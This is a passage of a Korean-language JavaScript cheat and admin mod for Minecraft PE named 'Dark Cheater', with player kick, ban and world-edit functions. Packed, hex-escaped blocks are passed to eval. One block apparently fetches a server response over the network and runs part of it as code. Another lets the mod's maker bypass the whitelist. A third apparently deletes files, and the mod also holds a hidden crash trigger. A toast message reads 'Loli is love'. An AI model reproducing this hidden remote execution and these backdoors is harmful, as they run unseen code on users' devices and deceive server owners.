wsin = Math.sin(mm*Math.PI/36);
wcos = Math.cos(mm*Math.PI/36);
setTile(wo.x1[n]+0.5+Data[1]*wsin, wo.y1[n]+nn, wo.z1[n]+0.5+Data[1]*wcos, Data[3], Data[4]);
}
}
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".sphere"){
for(var nn=-Data[1];nn<Number(Data[1])+1;nn++){
for(var m=-Data[1];m<Number(Data[1])+1;m++){
for(var o=-Data[1];o<Number(Data[1])+1;o++){
var sph = Math.pow(nn, 2)+Math.pow(m, 2)+Math.pow(o, 2);
if(sph>=Math.pow(Number(Data[1])-1, 2)&&sph<=Math.pow(Data[1], 2))
setTile(wo.x1[n]+nn, wo.y1[n]+m, wo.z1[n]+o, Data[2], Data[3]);
}}}
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}
if(Data[0]==".line"){
var pp = findHuman(user);
px = Entity.getX(pp);
py = Entity.getY(pp);
pz = Entity.getZ(pp);
yaw = Math.floor(Entity.getYaw(pp));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=1;gun<Number(Data[1])+1;gun++)
setTile(px+gun*sin, py, pz+gun*cos, Data[2], Data[3]);
if(wo.alert) Dark.toast(user+" : "+cmd+"\n("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")");
worldEditString += user+" : "+cmd+" ("+x1+"~"+z2+", "+y1+"~"+y2+", "+z1+"~"+z2+")\n";
preventDefault();
}


}


function fixPosData(){
w.x[2] = Math.min(w.x[0], w.x[1]);
w.y[2] = Math.min(w.y[0], w.y[1]);
w.z[2] = Math.min(w.z[0], w.z[1]);
w.x[3] = Math.max(w.x[0], w.x[1]);
w.y[3] = Math.max(w.y[0], w.y[1]);
w.z[3] = Math.max(w.z[0], w.z[1]);
}


function entityAddedHook(e){
if(noEnt&&!Player.isPlayer(e)&&antiEnt.indexOf(Entity.getEntityTypeId(e))!=-1)
Entity.remove(e);
if(anti>0&&Entity.getEntityTypeId(e)==64)
Entity.remove(e);
if(antiTerror[0]&&Entity.getEntityTypeId(e)==65)
Entity.remove(e);
if(Player.isPlayer(e)){
f.pp.push(e);
f.n.push(0);
if(pls.indexOf(e)==-1){
pls.push(e);
pls2.push(Player.getName(e));
}
if(noPlayer){
darkMessage(Player.getName(e)+"(을)를 내보냅니다.", true);
Entity.remove(e);
}
}
if(scriptOn&&Dark.read("scriptType")==7)
eval(Dark.read("scriptAdded"));
if(Player.isPlayer(e)){
var list = blackList.split("\n");
for(var n in list){
if(Player.getName(e)==list[n]){
if(blackListOn){
darkMessage("닉네임 밴 당한 플레이어("+Player.getName(e)+")가 감지되어 자동으로 강퇴합니다.", true);
Entity.remove(e);
}
else{
darkMessage("닉네임 밴 당한 플레이어("+Player.getName(e)+")가 들어왔습니다.");
}
break;
}
}
var list = blackListId.split("\n");
for(var n in list){
var list2 = list[n].toString().split("::");
if(e==list2[1]){
if(blackListIdOn){
darkMessage("맵 접속 방지를 당한 당한 플레이어가 감지되어 자동으로 강퇴합니다.", true);
darkMessage("원래 닉네임 : "+list2[0]+", 현재 닉네임 : "+Player.getName(e), true);
Entity.remove(e);
}
else{
darkMessage("맵 접속 방지를 당한 플레이어("+Player.getName(e)+")가 들어왔습니다.");
darkMessage("원래 닉네임 : "+list2[0]+", 현재 닉네임 : "+Player.getName(e), true);
}
break;
}
}
}
if(Entity.getEntityTypeId(e)==0){
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(150);
if(Player.isPlayer(e)) entityAddedHook(e);
}
}).start();
}
if(Player.isPlayer(e)){
serverLog += "[서버 접속] 닉네임 : "+Player.getName(e)+", 시간 : "+Dark.getTime()+"\n";
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(e)+"(이)가 서버에 들어옴\n";
}
if(whiteListOn&&Player.isPlayer(e)){
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('d 7=0;d c=l["\\k\\j\\g\\r\\4"]("\\n");q(d n=0;n<c["\\g\\3\\s\\5\\4\\m"];n++){9(b["\\5\\3\\4\\8\\a\\6\\3"](e)==c[n]){7=1;f}o 9(b["\\5\\3\\4\\8\\a\\6\\3"](e)==p()){7=2;f}}9(7==0){h("허가 받지 않은 플레이어("+b["\\5\\3\\4\\8\\a\\6\\3"](e)+")가 감지되어 자동으로 강퇴합니다.",i);t["\\u\\3\\6\\v\\w\\3"](e)}9(7==2)h("다크 치터 제작자("+b["\\5\\3\\4\\8\\a\\6\\3"](e)+")가 화이트 리스트를 뚫고 들어왔습니다.",i);',33,33,'|||x65|x74|x67|x6D|kick|x4E|if|x61|Player|list|var||break|x6C|darkMessage|true|x70|x73|whiteList|x68||else|darkCheaterEnable|for|x69|x6E|Entity|x72|x6F|x76'.split('|'),0,{});
eval(code);
}
if(Entity.getEntityTypeId(e)==93&&lp>0) explode(Entity.getX(e), Entity.getY(e), Entity.getZ(e), lp, true);


}


function explodeHook(e, x, y, z, p, f){
if(adTer||(!adTer&&ad!=e)){
if(antiTerror[1]){
preventDefault();
if(terrorAlert){
if(Entity.getEntityTypeId(e)==0)
Dark.toast("TNT의 폭발을 지웠습니다.");
if(Entity.getEntityTypeId(e)==33)
Dark.toast("크리퍼의 폭발을 지웠습니다.");
if(Entity.getEntityTypeId(e)==63)
Dark.toast("explode 함수의 폭발을 지웠습니다.");
}
}
}

if(exp.onoff){
if(Player.isPlayer(e)&&Level.getGameMode()==0){
var dis = getDistanceFromAdmin(x, y, z);
if(dis<=(p+1)&&exp.c==0){
if(dis>0.5){
Entity.setHealth(ad, Entity.getHealth(ad)-Math.round(3*p/dis));
}
else if(p<3){
Entity.setHealth(ad, Entity.getHealth(ad)-Math.round((5*p-1)/(dis+1)));
}
else{
Entity.setHealth(ad, Entity.getHealth(ad)-Math.round((5*p+4)/(dis+1)+2));
}
if(Math.abs(exp.x-x)<1.5&&Math.abs(exp.y-y)<1.5&&Math.abs(exp.z-z)<1.5){
exp.c = 1;
}
exp.x = x;
exp.y = y;
exp.z = z;
}
else if(exp.c==1){
exp.c = 2;
}
else if(exp.c==2){
exp.c = 0;
}
}
}
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] 위치 ("+x+", "+y+", "+z+")에서 "+p+" 규모의 폭발 발생\n";


}


function deathHook(m, v){
if(scriptOn&&Dark.read("scriptType")==6)
eval(Dark.read("scriptAdded"));
if(hyperLogOn){
if(Player.isPlayer(m)&&Entity.getEntityTypeId(v)==63) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(m)+"(이)가 "+Player.getName(v)+"(을)를 죽임\n";
if(Player.isPlayer(m)&&Entity.getEntityTypeId(v)!=63) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(m)+"(이)가 "+Entity.getEntityTypeId(v)+"번 엔티티를 죽임\n";
if(!Player.isPlayer(m)&&Entity.getEntityTypeId(v)==63) hyperLog += "["+Dark.getTime(2)+"] "+Entity.getEntityTypeId(m)+"번 엔티티가 "+Player.getName(v)+"(을)를 죽임\n";
if(!Player.isPlayer(m)&&Entity.getEntityTypeId(v)!=63) hyperLog += "["+Dark.getTime(2)+"] "+Entity.getEntityTypeId(v)+"번 엔티티 사망\n";
}

}


function darkCheaterEnable(tf){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('O{1f a="\\k\\i\\c\\1h\\F\\b\\f\\D\\g\\g\\j\\F\\1b\\s\\b\\m\\s\\b\\I\\b\\g\\f\\j\\x\\c\\h\\f\\b\\c\\p\\b\\b\\m\\c\\D\\h\\o\\g\\i\\k\\o\\J\\b\\b\\m\\N\\A\\k\\f\\h\\b\\c\\h\\f\\H\\1j\\h\\r\\b\\j\\h\\q\\f\\c\\f\\L\\f\\q\\s\\b\\f\\c\\j\\m\\j\\q\\p\\f\\c\\p\\b\\b\\m\\c\\q\\A\\k\\f\\h\\b\\c\\x\\f\\b\\p\\i\\o\\r\\c\\J\\b\\b\\m\\1i\\f\\b\\c\\B\\f\\b\\Y\\h\\b\\k\\b\\F\\c\\H\\g\\k\\b\\f\\Z\\i\\c\\q\\A\\i\\r\\f\\c\\b\\i\\I\\b\\g\\k\\h\\B\\c\\v\\c\\h\\x\\c\\b\\i\\j\\r\\b\\c\\g\\f\\j\\o\\c\\v\\G\\c\\r\\m\\A\\k\\b\\c\\s\\r\\f\\g\\D\\B\\f\\h\\b\\c\\p\\b\\b\\m\\1g\\y\\y\\o\\j\\g\\C\\b\\i\\g\\h\\j\\o\\i\\z\\o\\i\\b\\p\\i\\x\\f\\z\\q\\i\\z\\C\\g\\y\\o\\j\\g\\C\\N\\p\\f\\j\\b\\f\\g\\y\\c\\z\\b\\L\\b\\c\\k\\h\\1m\\i\\G\\c\\b\\g\\s\\f".W("\\c");X=u;a[w]=R 1s[a[0]][a[1]]();l(K){a[E]="1l"}M{a[E]="1n"}V[a[2]][a[3]][a[4]][a[5]](a[1a])[a[6]](R 1c[a[7]][a[8]][a[9]][a[10]][a[11]](a[1d]+a[E]+a[1e]))[a[12]]()[a[13]](a[w]);a[w][a[14]]();l(K){a[n]=P(a[w][a[15]]())[a[Q]]("d&d");l(a[n][1]=="1"){t[a[16]]=u}l(a[n][2]=="1"){t[a[17]]=u}l(a[n][3]=="1"){t["\\g\\f"]=u}l(a[n][4]=="1"){O{1k(a[n][5]+"");l(a[n][6]!=0){t["\\v\\v\\v"]=a[n][6]}}S(T){U[a[18]](T)}}l(U[a[19]](a[1o])==a[1p]){t[a[1q]]=u}}M{a[1r]=P(a[w][a[15]]())[a[Q]]("0")}}S(e){}',62,91,'||||||||||nox|x74|xXY|||x65|x72|x6E|x6F|x61|x69|if|x70|29|x64|x68|x63|x73|x75|dce|true|x62|27|x6D|x2F|x2E|x6C|x67|x6B|x41|28|x79|x32|x77|x53|x48|tf|x78|else|x43|try|String|21|new|catch|err|Dark|android|split|darkCheaterOn|x45|x54|||||||||||22|x4F|org|23|24|var|x3A|x42|x47|x49|eval|dcb|x66|dcb2|25|26|20|30|java'.split('|'),0,{});
eval(code);
if(tf!=true) return nox[30][1];
}


function removeDarkCheater(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('U{A a="\\x\\k\\u\\m\\F\\c\\h\\x\\k\\f\\p\\v\\b\\y\\q\\j\\c\\o\\f\\u\\p\\q\\k\\c\\i\\b\\Y\\g\\h\\o\\l\\b\\h\\l\\I\\i\\m\\b\\h\\m\\b\\J\\h\\o\\c\\b\\o\\h\\l\\g\\b\\o\\c\\p\\v\\g\\k\\b\\g\\m\\Q\\g\\i\\h\\p\\v\\b\\l\\c\\f\\i\\q\\k\\b\\t\\c\\o\\c\\g\\c\\b\\r\\t\\f\\g\\f\\r\\t\\f\\g\\f\\r\\p\\c\\g\\z\\x\\k\\u\\m\\F\\c\\h\\x\\k\\f\\p\\v\\z\\y\\q\\j\\c\\o\\f\\u\\p\\q\\k\\c\\i\\b\\z\\j\\i\\m\\r\\f\\j\\j\\C\\y\\m\\t\\l\\q\\i\\h\\j\\g\\l\\b\\r\\f\\j\\j\\C\\y\\m\\t\\l\\q\\i\\h\\j\\g\\l\\b\\N\\f\\i\\O\\b\\P\\k\\c\\f\\g\\c\\i".G("\\b");R=T;a[w]=a[11];B(H[a[0]][a[1]][a[2]][a[3]]())a[w]+=a[K];L a[w]+=a[M];A d=D E[a[4]][a[5]](s)[a[6]]();S(A n=0;n<d[a[7]];n++){B(d[n][a[8]]()[a[9]](a[V])!=1&&d[n][a[8]]()[a[9]](a[W])!=-1)D E[a[4]][a[5]](a[w]+"/"+d[n])[a[10]]()}}X(e){Z(e)}',62,64,'||||||||||nox|xXY|x65|||x61|x74|x69|x72|x70|x68|x73|x6F||x6C|x6E|x63|x2F||x64|x75|x67|16|x7A|x6D|x2E|var|if|x5F|new|java|x77|split|net|x50|x46|12|else|13|x44|x6B|x43|x53|darkCheaterOn2|for|true|try|14|15|catch|x55|clientMessage||'.split('|'),0,{});
eval(code);
}


function leaveGame(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
Dark.close(true);
if(btnE!=null){
btnE.dismiss();
btnE = null;
}
if(btnSS!=null){
btnSS.dismiss();
btnSS = null;
}
if(p.p!=null){
p.p.dismiss();
p.p = null;
}
if(btnR!=null){
btnR.dismiss();
btnR = null;
}
if(btnF!=null){
btnF.dismiss();
btnF = null;
}
if(cross!=null){
cross.dismiss();
cross = null;
}
if(menuJ!=null){
menuJ.dismiss();
menuJ = null;
}
if(w.btn!=null){
w.btn.dismiss();
w.btn = null;
}
if(w.menu!=null){
w.menu.dismiss();
w.menu = null;
}
showClock(false);
if(miniMap!=null){
miniMap.dismiss();
miniMap = null;
}
if(c.btn!=null){
c.btn.dismiss();
c.btn = null;
}
if(sBtn!=null){
sBtn.dismiss();
sBtn = null;
}
if(mcBtn!=null){
mcBtn.dismiss();
mcBtn = null;
}
}
}));
banList = new Array();
ModPE.resetFov();
run = false;
walk = false;
mc = false;
j.on = false;
climbing = false;
sneak = false;
smartMoving(false);
if(scriptOn&&Dark.read("scriptType")==5)
eval(Dark.read("scriptAdded"));
makeMinecraftClock(false);
makeFovEditor(false);
hyperLog += "["+Dark.getTime(2)+"] 맵 또는 서버에서 나감\n";
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(1000);
serverCheck();
}
}).start();
pls = [];
pls2 = [];
we.tf = false;
theSeed = false;
darkPointWindow(false);

}


function darkCheater(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
if(menu==null){
try{
menu = new android.widget.PopupWindow();
var title = makeTitle("Dark\nCheater\n", true);
title.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close();
Dark.save("makerFunc", true);
}
});
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = new Array();
var menus = ["인벤토리 수정", "월드 정보 수정", "플레이어 관리", "엔티티 관리", "지형 수정", "이동 계열", "D.L. Skill", "서버 관련", "테러 방지 옵션", "기타 기능", "환경 설정"];
for(var n in menus)
btns[n] = makeButton(menus[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
if(!pointTime){
inventorySet();
pointTime = true;
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
pointTime = false;
}
}), 300);
}
else if(pointTime){
darkPoint();
}
}
});
btns[0].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
armorEdit();
return true;
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
worldSet();
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
if(!banTime){
playerSet();
banTime = true;
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
banTime = false;
}
}), 300);
}
else if(banTime){
openBanList();
}
}
});
btns[2].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
playersSet();
return true;
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
entitySet(true);
}
});
btns[3].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
nearEntitySet();
return true;
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
worldEdit();
}
});
btns[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
moveSet();
}
});
btns[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
darkLiber();
}
});
btns[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
serverSetting();
}
});
btns[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
antiTerrorSet();
}
});
btns[8].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
terrorSet();
return true;
}
});
btns[9].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
elseSet(true);
}
});
btns[9].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
openPlus();
return true;
}
});
btns[10].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
darkCheaterSetting();
}
});
for(var n in menus)
layout.addView(btns[n]);
var exit = new android.widget.Button(ctx);
exit.setText("나가기");
exit.setBackgroundDrawable(setBtnColor());
exit.setTextColor(white2);
exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(true);
}
});
exit.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
ModPE.leaveGame();
Dark.toast("Quit to Title");
return true;
}
});
layout.addView(exit);
var text = new android.widget.TextView(ctx);
text.setText("\n© 2015 Dark Tornado\n");
text.setTextSize(11);
text.setTextColor(white2);
text.setGravity(android.view.Gravity.CENTER);
text.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close();
Dark.save("tra", true);
}
});
text.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
dce.re = true;
Dark.toast("로리는 사랑입니다.");
return true;
}
});
layout.addView(text);
var scroll = makeScroll(layout, menu);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menu.setContentView(layout2);
if(side==1) menu.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, 0, 0);
else menu.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.RIGHT|android.view.Gravity.TOP, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
else if(menu!=null){
Dark.close(true);
}
if(version==Dark.hyperRead("blockData")) makeCrash();
}
}));
}


function inventorySet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuI = new android.widget.PopupWindow();
var title = makeTitle("인벤토리 수정");
title.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
elr2 = 10;
Dark.toast("인첸트 강도 제한이 10으로 확장되었습니다.");
return true;
}
});
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var chest = new android.widget.ToggleButton(ctx);
chest.setTextOn("터치한 창고 내용 수정");
chest.setTextOff("터치한 창고 내용 수정");
chest.setChecked(editChest);
chest.setTextColor(white2);
chest.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
editChest = onoff;
}
}));
layout.addView(chest);
var inv = new android.widget.Button(ctx);
if(Level.getGameMode()==0)
inv.setText("아이템 지급");
if(Level.getGameMode()==1)
inv.setText("들고 있는 아이템으로 설정");
inv.setBackgroundDrawable(setBtnColor());
inv.setTextColor(white2);
inv.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
addItem(false);
}
});
inv.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
addItem(false, null, true);
return true;
}
});
layout.addView(inv);
var btns = new Array();
var menus = ["목록에서 지급/설정", "인벤토리 리셋", "들고 있는 아이템 삭제", "인첸트/해제", "아이템 이름 변경", "아이템 아이디", "갑옷 지급", "포션 조합법 보기"];
for(var n in menus)
btns[n] = makeButton(menus[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showItemList();
}
});
btns[0].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
itemSearch();
return true;
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for(var n=0;n<55;n++)
Player.clearInventorySlot(n);
Dark.toast("인벤토리가 리셋되었습니다.");
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Entity.setCarriedItem(Player.getEntity(), 0, 0, 0);
Dark.toast("삭제되었습니다.");
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
enchantDialog();
Dark.toast("아이템의 종류에 따라 가능한 인첸트가 다릅니다.");
}
});
btns[3].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
var itemName = Player.getItemCustomName(Player.getSelectedSlotId());
Entity.setCarriedItem(Player.getEntity(), getCarriedItem(), Player.getCarriedItemCount(), Player.getCarriedItemData());
if(itemName!=null) Player.setItemCustomName(Player.getSelectedSlotId(), itemName);
Dark.toast("인첸트가 해제되었습니다.");
return true;
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputItemName();
}
});
btns[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showItems();
}
});
btns[5].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
showPcItems();
return true;
}
});
btns[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showArmorList(true);
}
});
btns[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showPotionRecipe();
}
});
btns[7].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
potionList();
return true;
}
});
for(var n in menus)
layout.addView(btns[n]);
var exit = makeExit(menuI);
layout.addView(exit);
var scroll = makeScroll(layout, menuI);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuI.setContentView(layout2);
menuI.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function worldSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuW = new android.widget.PopupWindow();
var title = makeTitle("월드 정보 수정");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var text = new android.widget.TextView(ctx);
text.setText("  월드 이름 : "+Level.getWorldName()+"\n  폴더 이름 : "+Level.getWorldDir()+"\n  세계 : "+Level.getWorldType());
text.setTextSize(14);
text.setTextColor(white2);
layout.addView(text);
var time = new android.widget.ToggleButton(ctx);
time.setTextOn("시간 고정");
time.setTextOff("시간 고정");
time.setChecked(timeLock);
time.setTextColor(white2);
time.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
timeLock = true;
tlv = Level.getTime();
Dark.toast("시간이 "+tlv+"으로 고정되었습니다.");
}
else if(onoff==false){
timeLock = false;
Dark.toast("시간 고정이 풀렸습니다.");
}
}
}));
layout.addView(time);
var btns = new Array();
var menus = ["시간 설정", "게임모드 변경", "체력 설정", "플레이어 이동", "날씨 설정", "주변 창고 정보 수정", "다른 월드로 이동", "레벨/경험치 설정"];
for(var n in menus)
btns[n] = makeButton(menus[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
timeDialog();
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(Level.getGameMode()==0){
Level.setGameMode(1);
Dark.toast("크리에이티브로 변경되었습니다.");
}
else if(Level.getGameMode()==1){
Level.setGameMode(0);
Dark.toast("서바이벌로 변경되었습니다.");
}
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerTarget = ad;
playerHealth();
}
});
btns[2].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
playerHunger();
return true;
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerTp();
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
weatherSet();
}
});
btns[4].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
lightningPower();
return true;
}
});
btns[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
loadChestData = [];
loadChestCount = 0;
loadChest3 = 0;
loadChest = true;
Dark.toast("기다려 주세요...");
}
});
btns[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
selectMap();
Dark.toast("이동할 맵의 폴더명을 선택하세요...\n  일정 확률로 팅길 수 있습니다.");
}
});
btns[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputLevelAndExp();
}
});
for(var n in menus)
layout.addView(btns[n]);
var exit = makeExit(menuW);
layout.addView(exit);
var scroll = makeScroll(layout, menuW);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuW.setContentView(layout2);
menuW.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function playerSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuP = new android.widget.PopupWindow();
var title = makeTitle("플레이어 관리");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
var players2 = players.sort();
players = players2;
}
var op = new android.widget.Button(ctx);
op.setText("OP 권한 부여");
op.setBackgroundDrawable(setBtnColor());
op.setTextColor(white2);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = new Array();
for(var n in players){
radio[n] = new android.widget.RadioButton(ctx);
if(showPlayerHealth){
var pn = Player.getName(players[n]).split(" (");
radio[n].setText(pn[0]+"("+Entity.getHealth(players[n])+")");
}
else{
radio[n].setText(Player.getName(players[n])+"("+Entity.getHealth(players[n])+")");
}
radio[n].setId(n);
radio[n].setTextColor(white2);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
playerTarget = players[checkedId];
if(ops.indexOf(playerTarget)==-1)
op.setText("OP 권한 부여");
else
op.setText("OP 권한 회수");
}
}));
layout.addView(radios);
var sph = new android.widget.ToggleButton(ctx);
sph.setTextOn("플레이어 체력 표시");
sph.setTextOff("플레이어 체력 표시");
sph.setTextColor(white2);
sph.setChecked(showPlayerHealth);
sph.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff){
for(var n=0;n<pls.length;n++){
var pp = pls[n];
if(Player.isPlayer(pp)){
Entity.setNameTag(pp, Player.getName(pp)+" ("+Entity.getHealth(pp)+")");
}
else{
pls.splice(n, 1);
pls2.splice(n, 1);
}
}
}
else{
for(var n=0;n<pls.length;n++){
var pp = pls[n];
if(Player.isPlayer(pp)){
var pn = Player.getName(pp).split(" (");
Entity.setNameTag(pp, pn[0]);
}
}
}
showPlayerHealth = onoff;
}
}));
layout.addView(sph);
var button = new Array();
var menus = ["체력설정", "소환", "전송", "이동", "추방", "아이템 지급", "전원 사살" , "전원 소환", "포션 효과 부여/삭제", "조지기", "위치 확인", "시야 보기", "Client Id 보기", "칭호 부여", "최대 체력 설정"];
for(var n in menus)
button[n] = makeButton(menus[n]);
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerHealth();
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
teleport(playerTarget, Entity.getX(ad), Entity.getY(ad)+1, Entity.getZ(ad));
if(pca) darkMessage(Player.getName(playerTarget)+"(이)가 서버장의 위치로 소환되었습니다.", true);
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerTp();
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Entity.setPosition(ad, Entity.getX(playerTarget), Entity.getY(playerTarget), Entity.getZ(playerTarget));
if(pca) darkMessage("서버장이 "+Player.getName(playerTarget)+"에게 이동하었습니다.", true);
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.toast(Player.getName(playerTarget)+"(이)가 추방되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"(이)가 추방되었습니다.", true);
Entity.remove(playerTarget);
}
});
button[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
addItem(true);
}
});
button[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
for(var n in players)
Entity.setHealth(players[n], 0);
if(pca) darkMessage("모든 플레이어를 사살합니다.", true);
}
});
button[7].setOnClickListener(new android.view.View.OnClickListener(){
